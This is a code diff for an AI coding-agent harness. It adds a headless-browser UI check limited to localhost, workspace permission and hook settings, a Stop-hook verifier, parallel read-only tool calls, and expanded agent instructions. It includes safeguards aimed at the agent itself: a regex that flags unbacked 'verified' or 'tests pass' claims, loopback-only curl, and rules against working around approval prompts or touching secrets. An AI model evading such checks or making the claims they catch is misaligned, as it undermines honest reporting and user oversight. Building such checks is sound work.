+    return { success: false, error: `Blocked: verify_ui only checks this project's own local server (localhost/127.0.0.1) by default — "${url.hostname}" is an external target.` };
+  }
+
+  const serverConfig = mcpServers?.playwright;
+  if (!serverConfig) {
+    const exampleConfig = JSON.stringify({ mcpServers: { playwright: { command: "node", args: [PLAYWRIGHT_MCP_CLI, "--headless", "--isolated", "--image-responses", "omit"] } } });
+    return {
+      success: false,
+      error: `No Playwright MCP server configured for this project. Add to .kodo/settings.json: ${exampleConfig} — the path is absolute and points at kodo's own installation (this MCP server ships with kodo, not with your project), so copy it exactly rather than making it relative. UI verification is opt-in per project, same as everything else here.`,
+    };
+  }
+
+  let client = mcpClients.get("playwright");
+  if (!client) {
+    client = spawnMcpServer(serverConfig, root);
+    mcpClients.set("playwright", client);
+  }
+
+  try {
+    await client.callTool("browser_navigate", { url: url.href });
+  } catch (err) {
+    return { success: false, error: `Failed to navigate to ${url.href}: ${String(err?.message || err).slice(0, 300)}` };
+  }
+
+  const actionsResult = [];
+  for (const action of Array.isArray(args?.actions) ? args.actions : []) {
+    try {
+      const res = await runMcpAction(client, action);
+      actionsResult.push({ action, ok: !res.isError, detail: res.text.slice(0, 200) });
+      if (res.isError) break; // fail fast — later actions likely depend on this one succeeding
+    } catch (err) {
+      actionsResult.push({ action, ok: false, detail: String(err?.message || err).slice(0, 200) });
+      break;
+    }
+  }
+
+  const [consoleRes, networkRes] = await Promise.all([
+    client.callTool("browser_console_messages", { level: "warning" }).catch((e) => ({ text: String(e?.message || e) })),
+    client.callTool("browser_network_requests", { static: false }).catch((e) => ({ text: String(e?.message || e) })),
+  ]);
+  const consoleErrorCount = parseInt((consoleRes.text.match(/Errors:\s*(\d+)/i) || [])[1] || "0", 10);
+  const networkErrorCount = (networkRes.text.match(/\b[45]\d{2}\b/g) || []).length;
+  const signals = { consoleErrorCount, networkErrorCount };
+
+  const assertionDefs = Array.isArray(args?.assertions) && args.assertions.length ? args.assertions : [{ type: "no_console_errors" }];
+  const assertionsResult = [];
+  for (const a of assertionDefs) assertionsResult.push(await runAssertion(client, a, signals));
+
+  const actionsOk = actionsResult.every((a) => a.ok);
+  const assertionsOk = assertionsResult.every((a) => a.pass);
+  const pass = actionsOk && assertionsOk;
+
+  const result = {
+    success: true,
+    pass,
+    url: url.href,
+    actions_result: actionsResult,
+    assertions_result: assertionsResult,
+    console_errors_count: consoleErrorCount,
+    console_summary: consoleRes.text.slice(0, 400),
+    network_errors_count: networkErrorCount,
+    network_summary: networkRes.text.slice(0, 400),
+  };
+
+  if (!pass) {
+    // Escalate to vision only when text signals DON'T already explain the
+    // failure — a loud console/network error already tells the story; it's
+    // the SILENT failures (an assertion is false, nothing logged) that most
+    // need eyes on the actual pixels. Silently skipped (not an error) when
+    // no vision model is configured — that's a user choice, not a fault.
+    const silentFailure = consoleErrorCount === 0 && networkErrorCount === 0;
+    if (silentFailure && visionCreds) {
+      const screenshotPath = path.join(root, ".kodo", "scratch", `verify-ui-${Date.now()}.png`);
+      await fs.mkdir(path.dirname(screenshotPath), { recursive: true });
+      try {
+        await client.callTool("browser_take_screenshot", { filename: screenshotPath, fullPage: true });
+        result.screenshot_saved_to = screenshotPath;
+        const failedAssertions = assertionsResult.filter((a) => !a.pass)
+          .map((a) => `${a.type}${a.selector ? ` (${a.selector})` : ""}${a.text ? ` "${a.text}"` : ""}`).join(", ");
+        const visionSummary = await analyzeScreenshotWithVision(visionCreds, {
+          imagePath: screenshotPath,
+          promptContext: `This screenshot is from an automated UI check of ${url.href}. These checks failed with no console or network errors to explain why: ${failedAssertions}. Describe concisely what's visually wrong.`,
+        });
+        if (visionSummary) result.vision_summary = visionSummary;
+      } catch (err) {
+        result.screenshot_error = String(err?.message || err).slice(0, 200);
+      }
+    } else if (silentFailure && !visionCreds) {
+      result.vision_unavailable_reason = "no vision-capable model configured — add one in Settings to enable visual diagnosis of silent UI failures (checks that fail with no console/network error to explain them)";
+    }
+  }
+
+  return result;
 }
 
 export async function webSearch(query) {
@@ -503,11 +1074,61 @@ async function snapshotForUndo(root, sessionId, requestId, relPath, absPath) {
   }
 }
 
-// ── Post-edit hooks ───────────────────────────────────────────────────────────
+// ── Workspace settings: hooks + permissions + mcpServers ──────────────────────
+// One file, {workspace}/.kodo/settings.json, mirroring Claude Code's own
+// settings.json shape ({ hooks, permissions, mcpServers } side by side):
+//   {
+//     "hooks": { "postEdit": "prettier --write {file}", "stop": "npm run typecheck" },
+//     "permissions": { "allow": ["Bash(git push:*)"], "ask": [...], "deny": [...] },
+//     "mcpServers": { "playwright": { "command": "node", "args": ["<absolute path to kodo's node_modules/@playwright/mcp/cli.js>", "--headless", "--isolated"] } }
+//   }
+// mcpServers is opt-in per project, same as everything else here — no
+// capability (browser automation, future DB/Figma servers, etc.) exists
+// until a project declares it, matching Claude Code's real .mcp.json. The
+// path MUST be absolute: verify_ui spawns the server with cwd set to the
+// TARGET project's workspace, not kodo's own directory, so a relative path
+// resolves against the wrong filesystem location and the server exits
+// immediately (see PLAYWRIGHT_MCP_CLI below, and the exact absolute path
+// verify_ui itself suggests when mcpServers.playwright isn't configured).
 
-async function loadHooks(root) {
-  try { return JSON.parse(await fs.readFile(path.join(root, ".kodo", "hooks.json"), "utf-8")); }
-  catch { return {}; }
+function normalizePermissions(p) {
+  const arr = (v) => (Array.isArray(v) ? v.filter((x) => typeof x === "string") : []);
+  return { allow: arr(p?.allow), ask: arr(p?.ask), deny: arr(p?.deny) };
+}
+
+function normalizeMcpServers(m) {
+  if (!m || typeof m !== "object") return {};
+  const out = {};
+  for (const [name, cfg] of Object.entries(m)) {
+    if (cfg && typeof cfg.command === "string") {
+      out[name] = { command: cfg.command, args: Array.isArray(cfg.args) ? cfg.args.filter((a) => typeof a === "string") : [], env: (cfg.env && typeof cfg.env === "object") ? cfg.env : {} };
+    }
+  }
+  return out;
+}
+
+async function loadKodoSettings(root) {
+  try {
+    const raw = JSON.parse(await fs.readFile(path.join(root, ".kodo", "settings.json"), "utf-8"));
+    return {
+      hooks: (raw && typeof raw.hooks === "object" && raw.hooks) || {},
+      permissions: normalizePermissions(raw?.permissions),
+      mcpServers: normalizeMcpServers(raw?.mcpServers),
+    };
+  } catch {
+    return { hooks: {}, permissions: normalizePermissions(null), mcpServers: {} };
+  }
+}
+
+// verify_ui spawns MCP server child processes lazily into ctx.mcpClients
+// (empty for the overwhelming majority of runs that never call it). Whatever
+// got spawned MUST be torn down before the run ends, or a headless Chromium
+// instance is orphaned per run that used it — these are real OS processes,
+// not something GC reclaims.
+function closeMcpClients(ctx) {
+  for (const client of ctx.mcpClients?.values() || []) {
+    try { client.close(); } catch { /* best-effort */ }
+  }
 }
 
 async function runPostEditHook(root, relPath, hooks, emit) {
@@ -521,43 +1142,59 @@ async function runPostEditHook(root, relPath, hooks, emit) {
   if (res.exit_code !== 0) console.warn(`[AgentLoop] postEdit hook failed (${res.exit_code}): ${String(res.stderr).slice(0, 200)}`);
 }
 
-// ── Enforced verification ─────────────────────────────────────────────────────
-// The model only reliably reacts to checks that fail LOUDLY (a syntax error, a
-// failed edit). Bugs that pass typecheck but are visually/behaviorally broken
-// (a dead style prop, a group-hover with no `group` ancestor, an unused var)
-// slip straight through if verification is left entirely up to the model's own
-// judgment. Running the project's real lint/typecheck here — unconditionally,
-// after every run that touched frontend files — closes that gap regardless of
-// whether the model remembered to check its own work.
-const FRONTEND_PREFIX = "chatbot/my-chatbot-ui/";
+// ── Stop hook (verification) ──────────────────────────────────────────────────
+// Kodo runs on arbitrary, per-user workspaces — it has no reliable way to
+// guess a project's toolchain (script names, package manager, whether it even
+// uses npm/eslint/tsc at all). Heuristically sniffing package.json for likely
+// script names is always wrong for somebody. Claude Code doesn't solve this by
+// guessing either: verification is (a) the model's own job, self-directed —
+// it reads the project and runs whatever "npm test" / "cargo check" / etc.
+// actually applies, the same way it would for any unfamiliar repo — and (b)
+// optionally backstopped by a Stop hook the PROJECT declares for itself, since
+// only the project's own author knows what "verified" really means for it.
+// This mirrors that exactly: a `stop` command in {workspace}/.kodo/settings.json
+// runs once after a turn that edited files, before the agent may finish. A
+// non-zero exit blocks completion and its output is fed back as the reason —
+// same contract as Claude Code's Stop hook (and this file's own postEdit
+// hook above). With no hook configured, nothing is auto-run and no "verified"
+// claim is made — verification is whatever the model itself chose to do,
+// exactly as the VERIFY step in the system prompt already asks for.
+// Matches confident-sounding verification claims a model might write in its
+// own FINISH-step prose ("✅ Verified", "tests pass", "typecheck and lint
+// pass", "build succeeds", etc.) — used to catch the claim when nothing in
+// this turn actually backs it up. See the anti-fabrication backstop below.
+const VERIFICATION_CLAIM_RE = /(✅\s*)?\bverified\b|\btests?\s+pass(ed|es)?\b|\btypecheck(ing)?\s+(and\s+lint\s+)?pass(ed|es)?\b|\blint(ing)?\s+pass(ed|es)?\b|\bbuild\s+(succeed(s|ed)?|passes?|passed|is\s+successful)\b/gi;
+// A denial ("not verified", "couldn't run tests", "unable to verify") right
+// before a match means the model is ALREADY being honest — don't flag that
+// as a fabricated claim, or the correction note would contradict a sentence
+// that was true.
+const DENIAL_BEFORE_RE = /\b(not|n't|no|never|without|unable to|failed to|couldn't|didn't|isn't|wasn't|hasn't|haven't|aren't|weren't)\s+(\w+\s+){0,3}$/i;
+// Loosely matches bash commands that plausibly represent a real check —
+// deliberately broad (no toolchain guessing, same philosophy as runStopHook)
+// so this only fires when NOTHING resembling a check was run at all.
+const VERIFY_COMMAND_RE = /\b(test|lint|tsc|typecheck|jest|vitest|pytest|eslint|ruff|mypy|build|cargo\s+(check|test|build)|curl\s)\b/i;
 
-async function autoVerifyFrontendEdits(root, editedFiles, emit) {
-  const frontendFiles = editedFiles
-    .filter((p) => p.startsWith(FRONTEND_PREFIX))
-    .map((p) => p.slice(FRONTEND_PREFIX.length));
-  if (frontendFiles.length === 0) return null;
-  emit?.({ type: "progress", stage: "executing", message: "🔍 Auto-verifying: typecheck + lint..." });
-
-  // Typecheck is whole-project by nature (tsc needs the full program to see
-  // cross-file breakage) — fine here since the project's baseline typecheck
-  // is clean. Lint is scoped to ONLY the files this run touched: a bare
-  // `npm run lint` runs across the whole app, and a repo can easily carry
-  // pre-existing lint errors in files the agent never touched — that would
-  // fail this gate on every single edit regardless of what actually changed.
-  const lintTargets = frontendFiles.map((f) => shellQuote(f)).join(" ");
-  const [typecheck, lint] = await Promise.all([
-    runBash("npm --prefix chatbot/my-chatbot-ui run typecheck", root, 120_000),
-    runBash(`cd chatbot/my-chatbot-ui && npx eslint ${lintTargets}`, root, 120_000),
-  ]);
-
-  const failures = [];
-  if (typecheck.exit_code !== 0) {
-    failures.push(`TYPECHECK FAILED:\n${(typecheck.stdout + "\n" + typecheck.stderr).trim().slice(0, 3000)}`);
+// True only if `text` asserts verification happened, unhedged by a nearby
+// denial ("not verified" doesn't count — that's the model already being
+// honest, not a claim to correct).
+function hasUnhedgedVerificationClaim(text) {
+  const re = new RegExp(VERIFICATION_CLAIM_RE.source, "gi");
+  let m;
+  while ((m = re.exec(text))) {
+    const before = text.slice(Math.max(0, m.index - 40), m.index);
+    if (!DENIAL_BEFORE_RE.test(before)) return true;
   }
-  if (lint.exit_code !== 0) {
-    failures.push(`LINT FAILED:\n${(lint.stdout + "\n" + lint.stderr).trim().slice(0, 3000)}`);
-  }
-  return failures.length ? failures.join("\n\n") : null;
+  return false;
+}
+
+export async function runStopHook(root, hooks, emit) {
+  const cmd = hooks?.stop;
+  if (!cmd || typeof cmd !== "string") return { ran: false, passed: true, output: "" };
+  const invalid = validateBashCommand(cmd);
+  if (invalid) { console.warn(`[AgentLoop] stop hook rejected: ${invalid}`); return { ran: false, passed: true, output: "" }; }
+  emit?.({ type: "progress", stage: "executing", message: `🔍 verify: ${cmd.slice(0, 80)}` });
+  const res = await runBash(cmd, root, 120_000);
+  return { ran: true, passed: res.exit_code === 0, output: `${res.stdout}\n${res.stderr}`.trim().slice(0, 3000) };
 }
 
 // ── Tool schema ───────────────────────────────────────────────────────────────
@@ -615,14 +1252,39 @@ const AGENT_TOOLS = [
     type: "function",
     function: {
       name: "bash",
-      description: "Run a shell command in the workspace root (allowlisted: node, npm, npx, git, tsc, eslint, ls, grep, etc.). Use for: installing packages, running tests/typecheck (`npm --prefix chatbot/my-chatbot-ui run typecheck`), git status, moving files. Output is truncated; keep commands focused.",
+      description: "Run a shell command in the workspace root (baseline allowlist: node, npm, npx, git, tsc, eslint, curl, ls, grep, etc. — a workspace's .kodo/settings.json permissions can grant additional commands, require approval for some, or block others). Use for: installing packages, running the project's own test/typecheck/lint scripts (check the relevant sub-project's package.json `scripts` — commands run from the workspace root, so `cd`/`npm --prefix` into the right sub-directory first if it's not at the root), git status, moving files, and hitting a server YOU started with curl (e.g. `curl -s http://localhost:5555/api/foo` after starting it with run_in_background) to confirm a route actually responds instead of assuming it does from reading the code. curl is loopback-only by default (localhost/127.0.0.1) — an external URL needs the workspace to opt in via permissions, same as any other non-baseline command. Do NOT use this for reading a file (use read_file), searching file contents (use grep), finding files by name (use glob), or listing a directory (use list_files) — those dedicated tools exist for exactly this and bash's cat/grep/ls/find are only here for when they're one step in a larger shell pipeline. This matters beyond style: edit_file only accepts editing a file that was read via the read_file TOOL specifically (bash cat doesn't count, even though you saw the content) — using bash to \"read\" a file you intend to edit will make the edit fail with a read-it-first error. If a command is rejected as ask-only, it will pause for the user's approval — that's expected, not a failure to work around. CRITICAL: any command that doesn't exit on its own (dev servers, watch mode, `npm run dev`, long-lived processes) MUST be run with run_in_background:true — running it normally will just hang until the timeout and get killed, producing nothing useful. Output is truncated; keep commands focused.",
       parameters: {
         type: "object",
         properties: {
           command: { type: "string" },
-          timeout_ms: { type: "number", description: "Max runtime in ms (default 120000, max 300000)" },
+          timeout_ms: { type: "number", description: "Max runtime in ms for a normal (non-background) command (default 120000, max 300000)" },
+          run_in_background: { type: "boolean", description: "Set true for anything that doesn't exit on its own — dev servers, watch mode, long-lived processes. Returns immediately with a task_id; check progress with bash_output, stop it with kill_shell." },
         },
         required: ["command"],
+      },
+    },
+  },
+  {
+    type: "function",
+    function: {
+      name: "bash_output",
+      description: "Check a background task's status and accumulated stdout/stderr since it started (use the task_id a run_in_background bash call returned). Call this after starting a server to confirm it actually came up before telling the user it's running — don't just assume it worked.",
+      parameters: {
+        type: "object",
+        properties: { task_id: { type: "string" } },
+        required: ["task_id"],
+      },
+    },
+  },
+  {
+    type: "function",
+    function: {
+      name: "kill_shell",
+      description: "Stop a background task started with bash's run_in_background (and its child processes). Use this before restarting the same server on a different port or command — starting a second instance without stopping the first usually just fails with a port-in-use error.",
+      parameters: {
+        type: "object",
+        properties: { task_id: { type: "string" } },
+        required: ["task_id"],
       },
     },
   },
@@ -747,6 +1409,48 @@ const AGENT_TOOLS = [
   {
     type: "function",
     function: {
+      name: "verify_ui",
+      description: "Actually exercise a page from a server YOU started (real headless browser via a Playwright MCP server — requires the project's .kodo/settings.json to declare mcpServers.playwright; if it doesn't, this returns an error telling you the exact config to add) to verify it renders and behaves — not just that it typechecks. Give it a URL, an optional batch of actions to perform first (click/fill/navigate/wait_for), and assertions to check afterward (visible/text_contains/no_console_errors/no_network_errors — defaults to no_console_errors if you omit assertions). Returns one compact result: pass/fail, per-action and per-assertion results, console/network error counts. On a FAILURE that has no console or network error to explain it (a 'silent' failure — the kind static checks and error logs both miss), it automatically takes a screenshot and, ONLY if a vision-capable model is configured for this user, asks it to describe what's visually wrong (you'll see that as vision_summary; if no vision model is configured you'll see vision_unavailable_reason instead — that's expected, not a failure on your part). Use this after building/editing a UI, once the dev server is confirmed up, before claiming the feature works.",
+      parameters: {
+        type: "object",
+        properties: {
+          url: { type: "string", description: "e.g. http://localhost:5173/ or http://localhost:5173/some/route" },
+          actions: {
+            type: "array",
+            description: "Steps to run, in order, after navigating to url. Optional — omit for a simple load-and-check.",
+            items: {
+              type: "object",
+              properties: {
+                type: { type: "string", enum: ["navigate", "click", "fill", "wait_for"] },
+                selector: { type: "string", description: "CSS selector — required for click/fill" },
+                text: { type: "string", description: "Text to type (fill) or wait for (wait_for)" },
+                seconds: { type: "number", description: "For wait_for: seconds to wait instead of waiting for text" },
+                submit: { type: "boolean", description: "For fill: press Enter after typing" },
+              },
+              required: ["type"],
+            },
+          },
+          assertions: {
+            type: "array",
+            description: "Checks to run after the actions. Omit to default to just [no_console_errors].",
+            items: {
+              type: "object",
+              properties: {
+                type: { type: "string", enum: ["visible", "text_contains", "no_console_errors", "no_network_errors"] },
+                selector: { type: "string", description: "CSS selector — required for visible" },
+                text: { type: "string", description: "Required for text_contains" },
+              },
+              required: ["type"],
+            },
+          },
+        },
+        required: ["url"],
+      },
+    },
+  },
+  {
+    type: "function",
+    function: {
       name: "ask_user",
       description: "Ask the user a clarifying question instead of guessing. Use when a requirement is genuinely ambiguous, you're about to make a consequential or hard-to-reverse choice, or you need information only the user has — not when you can find the answer yourself by reading the code. Call this ALONE (no other tool calls in the same turn) and wait for the answer before continuing. Prefer 2-4 concrete options when the choice is discrete; omit options for open-ended questions.",
       parameters: {
@@ -849,7 +1553,17 @@ export function normalizeArgumentsJSON(raw) {
     return JSON.stringify(JSON.parse(trimmed));   // already clean → re-canonicalize
   } catch {
     const salvaged = firstJSONValue(trimmed);     // drop trailing "extra data"
-    return salvaged !== undefined ? JSON.stringify(salvaged) : "{}";
+    if (salvaged !== undefined) return JSON.stringify(salvaged);
+    // Non-empty but truly unparseable (not just trailing junk) almost always
+    // means the response was cut off mid-argument — e.g. a large write_file
+    // `content` string hit the model's output token cap. Silently defaulting
+    // to {} used to make the tool fail with a generic "path is required" and
+    // no explanation, leaving the model to guess workarounds instead of
+    // understanding the real cause. Surface it via a sentinel property that
+    // executeTool checks before any tool-specific logic runs.
+    return JSON.stringify({
+      __kodo_parse_error__: `arguments (${trimmed.length} chars) could not be parsed as JSON — the response was very likely cut off mid-argument because the content was too large for one turn.`,
+    });
   }
 }
 
@@ -883,6 +1597,61 @@ const MUTATING_TOOLS = new Set(["edit_file", "write_file", "bash"]);
 // bash commands that only read — exempt from ask-mode approval
 const BASH_READONLY_RE = /^\s*(ls|cat|grep|rg|find|wc|head|tail|pwd|which|stat|du|tree|git\s+(status|log|diff|show|branch)|npm\s+(ls|view|outdated)|node\s+--check)\b[^;&|]*$/;
 
+// Side-effect-free tools, safe to execute CONCURRENTLY when the model batches
+// several into one turn — e.g. reading 6 related component files before
+// editing them. This is the same principle Claude Code itself follows
+// ("independent tool calls run in parallel"); kodo's loop used to run every
+// call in a turn strictly one-at-a-time regardless, which cost real wall-clock
+// time on read/research-heavy phases of a large build against the graph's
+// hard 25-minute timeout. Anything that mutates state, spawns a persistent
+// process, or needs a user decision (write_file/edit_file/bash/kill_shell/
+// todo_write/spawn_agent/ask_user) stays sequential and in order — kodo's
+// undo-snapshot/hook/approval machinery assumes one mutation completes before
+// the next starts, and running those concurrently could reorder or race them.
+const PARALLELIZABLE_TOOLS = new Set([
+  "read_file", "grep", "glob", "list_files", "web_search", "fetch_url",
+  "list_memory_topics", "read_memory_topic", "load_skill", "bash_output",
+]);
+
+async function runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget) {
+  console.log(`[AgentLoop] ${iteration}/${iterationBudget} → ${toolCall.function.name}(${JSON.stringify(args).slice(0, 140)})`);
+  const result = await executeTool(toolCall.function.name, args, ctx);
+  const raw = JSON.stringify(result);
+  const capped = raw.length > MAX_TOOL_OUTPUT_CHARS ? raw.slice(0, MAX_TOOL_OUTPUT_CHARS) + '..."[truncated]"}' : raw;
+  return { role: "tool", tool_call_id: toolCall.id, content: capped };
+}
+
+// Execute one turn's tool calls: side-effect-free ones (PARALLELIZABLE_TOOLS)
+// run concurrently; everything else runs strictly sequentially and in order,
+// draining any pending parallel batch first so a mutation never starts before
+// reads issued earlier in the same turn have resolved. Returns tool result
+// messages in original call order — a mid-batch abort leaves later slots
+// unfilled, which are dropped rather than returned as `undefined` holes.
+// Shared by the main loop and the sub-agent loop (both need the same
+// correctness properties); exported so it's directly testable without a live
+// LLM call.
+export async function executeToolCallsBatch(toolCalls, ctx, iteration, iterationBudget, abortSignal) {
+  const results = new Array(toolCalls.length);
+  let pendingParallel = [];
+  for (let i = 0; i < toolCalls.length; i++) {
+    if (abortSignal?.aborted) break;
+    const toolCall = toolCalls[i];
+    let args = {};
+    try { args = JSON.parse(toolCall.function.arguments || "{}"); } catch {}
+
+    if (PARALLELIZABLE_TOOLS.has(toolCall.function.name)) {
+      pendingParallel.push(
+        runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget).then((r) => { results[i] = r; })
+      );
+      continue;
+    }
+    if (pendingParallel.length) { await Promise.all(pendingParallel); pendingParallel = []; }
+    results[i] = await runAndFormatToolCall(toolCall, args, ctx, iteration, iterationBudget);
+  }
+  if (pendingParallel.length) await Promise.all(pendingParallel);
+  return results.filter(Boolean);
+}
+
 // ── Sub-agent (spawn_agent) ────────────────────────────────────────────────────
 // A self-contained, read-only agent loop with its OWN context window. The parent
 // delegates a focused investigation; only the sub-agent's final report crosses
@@ -896,13 +1665,16 @@ const SUBAGENT_SYSTEM = `You are a focused sub-agent spawned by Kodo's main codi
 - Be efficient: gather exactly what the task asks for, then STOP.
 - Finish with a plain-text report (no tool calls): concrete findings — file paths with line numbers, the specific answer, and anything the main agent needs to act. Lead with the answer, keep it tight. Don't pad.`;
 
-async function runSubAgent({ creds, root, description, task, workspaceSnapshot, hooks, emit, abortSignal }) {
+async function runSubAgent({ creds, root, description, task, workspaceSnapshot, hooks, permissions, emit, abortSignal }) {
   const label = String(description || "investigating").slice(0, 60);
   emit?.({ type: "progress", stage: "exploring", message: `🔍 sub-agent: ${label}` });
 
   // Read-only ctx. permissionMode:"plan" makes edit_file/write_file/mutating
   // bash fail inside executeTool even if the sub-agent's model tries them.
-  // isSubAgent guards against a sub-agent spawning further sub-agents.
+  // isSubAgent guards against a sub-agent spawning further sub-agents. The
+  // workspace's permission rules still apply to whatever read-only bash it
+  // does run — deny rules always hold, and "ask" rules simply block (no
+  // askUser here to pause on) rather than silently widening access.
   const subCtx = {
     root,
     emit: (e) => {
@@ -911,6 +1683,7 @@ async function runSubAgent({ creds, root, description, task, workspaceSnapshot, 
     sessionId: "subagent",
     requestId: "subagent",
     hooks,
+    permissions,
     editedFiles: new Map(),
     readFiles: new Set(),
     todosRef: { current: [] },
@@ -938,6 +1711,7 @@ async function runSubAgent({ creds, root, description, task, workspaceSnapshot, 
         maxTokens: 4000,
         temperature: 0,
         signal: abortSignal || undefined,
+        thinking: false, // read-only investigation loop — mechanical tool execution
       }));
     } catch (err) {
       return `Sub-agent failed: ${String(err?.message || err).slice(0, 200)}`;
@@ -949,20 +1723,7 @@ async function runSubAgent({ creds, root, description, task, workspaceSnapshot, 
       return String(message.content || "").trim() || "Sub-agent returned no findings.";
     }
 
-    const toolResults = [];
-    for (const toolCall of message.tool_calls) {
-      if (abortSignal?.aborted) break;
-      let args = {};
-      try { args = JSON.parse(toolCall.function.arguments || "{}"); } catch {}
-      const result = await executeTool(toolCall.function.name, args, subCtx);
-      const raw = JSON.stringify(result);
-      toolResults.push({
-        role: "tool",
-        tool_call_id: toolCall.id,
-        content: raw.length > MAX_TOOL_OUTPUT_CHARS ? raw.slice(0, MAX_TOOL_OUTPUT_CHARS) + '..."[truncated]"}' : raw,
-      });
-    }
-    conversation.push(...toolResults);
+    conversation.push(...(await executeToolCallsBatch(message.tool_calls, subCtx, iteration, SUBAGENT_MAX_ITERATIONS, abortSignal)));
   }
 
   // Budget exhausted — ask for a final report with no more tools.
@@ -975,6 +1736,7 @@ async function runSubAgent({ creds, root, description, task, workspaceSnapshot, 
       maxTokens: 1500,
       temperature: 0,
       signal: abortSignal || undefined,
+      thinking: false,
     });
     return String(message.content || "").trim() || "Sub-agent reached its step limit without a conclusion.";
   } catch {
@@ -1013,28 +1775,42 @@ ${currentDateLine()} Use it whenever "today / now / latest / recent / this year"
 # YOU APPLY CHANGES — you don't hand out code (most important rule)
 When the user asks you to add / build / create / implement / change / fix / refactor / improve something, you MUST make the change yourself by calling write_file / edit_file on the real files. Do NOT paste a code block and tell the user where to put it — that is a failure. "Build a feedback form on /profile" means: find the route, create/edit the component files, wire it up, verify. Actually editing files is the whole point of this agent.
 ONLY respond with code as text (without editing) when the user EXPLICITLY asks for that — e.g. "just show me the code", "don't edit anything", "give me the snippet", "how would I write…". Otherwise, always edit the files.
+Same rule for RUNNING something — "run the server", "start the frontend", "how do I run this on port X": don't just print the command and tell the user to run it themselves, actually run it with bash. A dev server never exits on its own, so use \`run_in_background:true\` (otherwise the call just hangs until it times out and gets killed) — then call bash_output to confirm it actually started (a real port/URL in the output, no crash) BEFORE telling the user it's running. If something is likely already running on that port from an earlier turn, kill_shell it first — starting a second instance usually just fails with a port-in-use error instead of doing anything.
 
 # How you work
-1. UNDERSTAND — read the files involved before touching them. Use grep/glob to locate things; never guess file contents.
+1. UNDERSTAND — read the files involved before touching them. Use grep/glob to locate things; never guess file contents. When you need several independent, read-only things (e.g. reading N related component files before editing any of them, or a few unrelated greps), call them together as multiple tool calls in the SAME turn rather than one-at-a-time across separate turns — they run concurrently, so batching costs nothing and finishes faster. This does not apply to edit_file/write_file/bash/todo_write, which must stay one at a time and in order.
 2. TRACK — for any request with 2+ distinct steps, maintain a todo list with todo_write and keep it updated as you go.
 3. ACT — make focused, minimal edits with edit_file (preferred) or write_file (new files / full rewrites). Match the existing code style. This step is where you actually call the tools — don't stop at describing the change.
-4. VERIFY — after code changes, check your work: run a typecheck or build via bash (frontend: \`npm --prefix chatbot/my-chatbot-ui run typecheck\`), re-read the edited region, or run tests. Fix what you broke before finishing.
-5. FINISH — when done, reply with plain text (no tool calls): a concise summary of what you CHANGED, file by file, and how you verified it. (Not a tutorial — a report of edits you made.)
+4. VERIFY — after code changes, check your work yourself: read the sub-project you touched (its package.json / project config) and run ITS actual typecheck, lint, build, or test command via bash — don't assume a project name, script name, or toolchain, discover it from what's really there, the same way you would in any unfamiliar repo. Re-read the edited region too. Fix what you broke before finishing. Typecheck/lint only prove the code PARSES — for a real functional claim, go further when the work calls for it:
+   - Backend route/API work: start the server (run_in_background), then bash \`curl\` the actual endpoint(s) you touched and check the real response — don't conclude "it works" from reading the code. curl only reaches localhost/127.0.0.1 by default.
+   - Frontend/UI work: start the dev server, then verify_ui the actual page (add actions for anything the feature requires — click a button, type into a field, wait for text to appear — and assertions for what should be true afterward) — it catches a component that typechecks but throws on render, or renders blank, which no static check can. If verify_ui reports it's not configured for this project, tell the user the exact .kodo/settings.json snippet it gave you rather than silently skipping UI verification. Don't call it done on a green typecheck alone.
+   - If the project already has its own test suite/framework, extend it for the new logic you added, the same way you'd follow any other existing convention in an unfamiliar repo — but don't invent a test framework or culture for a project that doesn't have one unless asked.
+   (If this workspace has a \`.kodo/settings.json\` \`hooks.stop\` command configured, it also runs automatically and blocks you from finishing until it passes — but that's a backstop, not a substitute for checking your own work.)
+5. FINISH — when done, reply with plain text (no tool calls): a concise summary of what you CHANGED, file by file, and how you verified it. (Not a tutorial — a report of edits you made.) Only say "verified" / "tests pass" / "✅" if you actually ran that check THIS turn and saw it pass — never write it as a habitual closing line. If you didn't run a real check (no test/lint/build command, no server hit with curl, no verify_ui), say so plainly instead: e.g. "not verified — no build/test command found in this project."
 
 # Rules
+- Use the dedicated tool, not its bash equivalent: read_file (not \`bash cat\`), grep (not \`bash grep\`), glob (not \`bash find\`), list_files (not \`bash ls\`). This isn't style — edit_file only accepts a file that was read via the read_file TOOL (bash cat doesn't count, even though you saw the content), and grep/glob already exclude node_modules/.git/build output automatically while a raw bash search doesn't. Reserve bash's cat/grep/ls/find for when they're one step inside a larger shell pipeline (e.g. \`grep -l foo *.ts | xargs ...\`), not as your primary way to read or search.
 - edit_file's old_string must match the file EXACTLY (copy it from read_file output, whitespace included) and be unique — include neighbouring lines to disambiguate.
 - Never re-create a file that exists; read then edit it.
 - Prefer several small edits over one giant rewrite. Rewrites lose the user's untouched code.
+- NEVER write file content via bash (heredoc \`cat <<EOF\`, \`echo ... > file\`, \`node -e\`/\`python3 -c\`, etc.) — always write_file (new file) or edit_file (existing file). This applies even if a file feels large: if it doesn't fit in one write_file call, write a smaller version and extend it with edit_file, or split it into several edit_file additions — don't reach for bash as a workaround, it has a much smaller size limit and skips syntax validation, undo snapshots, and the diff shown to the user entirely.
+- If a .ts/.tsx string needs to CONTAIN literal backtick characters as data (e.g. mock content with markdown code fences \`\`\`, or any text that itself uses backticks) — do NOT reach for a JS/TS template literal for the outer string. A template literal containing unescaped nested backticks is invalid syntax and write_file will correctly reject it; the fix is not a different tool, a bash workaround, or a helper script — it's a different STRING TYPE. Use a regular single/double-quoted string with \\n for newlines instead; it has no delimiter collision with the backticks inside it. If you get an "unterminated template literal" or similar parse error back, that specific mismatch — quote type vs. content — is almost always the cause: fix the string type, don't change tools.
+- For a big multi-file build (many new components etc.), create files a few at a time across several turns rather than trying to fit everything into one response — a turn that runs out of room mid-file is worse than spreading the same work across more turns.
 - If a tool call fails, read the error, adapt, and retry differently — don't repeat the identical call.
 - Keep dependencies minimal; use bash \`npm install <pkg> --prefix <subproject>\` only when the task truly needs a new package.
+- For a throwaway check (e.g. confirming what an installed package actually exports before you rely on it), write it under \`.kodo/scratch/\` and delete it with bash \`rm\` once you're done — never leave debug/check files sitting in the project's real source tree.
+- Anything that doesn't exit on its own (dev servers, watch mode, long-running processes) MUST use bash's \`run_in_background:true\`, verified afterward with bash_output — never run it as a normal blocking bash call, and never just tell the user to run it themselves when you have the tools to do it.
 - For UI/design/animation work: load the matching skill first (see list), respect the project's design tokens, and keep accessibility (contrast, reduced-motion) intact.
 - Never touch .env, secrets, lockfiles, or files outside the workspace.
 
